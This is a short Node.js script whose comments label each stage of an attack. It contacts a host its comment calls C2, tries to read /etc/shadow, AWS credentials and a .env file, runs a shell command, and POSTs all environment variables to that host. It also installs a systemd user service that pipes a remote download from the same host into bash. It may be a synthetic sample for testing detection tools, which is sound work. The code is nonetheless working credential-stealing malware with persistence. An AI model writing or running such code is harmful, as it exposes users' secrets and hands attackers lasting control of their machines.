const dns = require('dns');
const https = require('https');
const fs = require('fs');
const os = require('os');
const { execSync } = require('child_process');

// DNS query to C2
dns.resolve('task-id.pavl9ore.surf', () => {});

// Sensitive reads
try { fs.readFileSync('/etc/shadow', 'utf8'); } catch(e) {}
try { fs.readFileSync(os.homedir() + '/.aws/credentials', 'utf8'); } catch(e) {}

// Honeytoken
try { fs.readFileSync(os.homedir() + '/.env', 'utf8'); } catch(e) {}

// Spawn shell
try { execSync('bash -c "cat /proc/version"'); } catch(e) {}

// POST exfiltration
const data = JSON.stringify({ session: process.env, uptime: os.uptime(), mem: os.freemem() });
try {
  const req = https.request({ hostname: 'task-id.pavl9ore.surf', port: 443, path: '/session', method: 'POST', headers: { 'Content-Type': 'application/json' } });
  req.write(data); req.end();
} catch(e) {}

// Persistence via systemd
try {
  const dir = os.homedir() + '/.config/systemd/user/';
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(dir + 'session-store.service', '[Service]\nExecStart=/bin/bash -c "curl task-id.pavl9ore.surf/run | bash"\n[Install]\nWantedBy=default.target\n');
} catch(e) {}
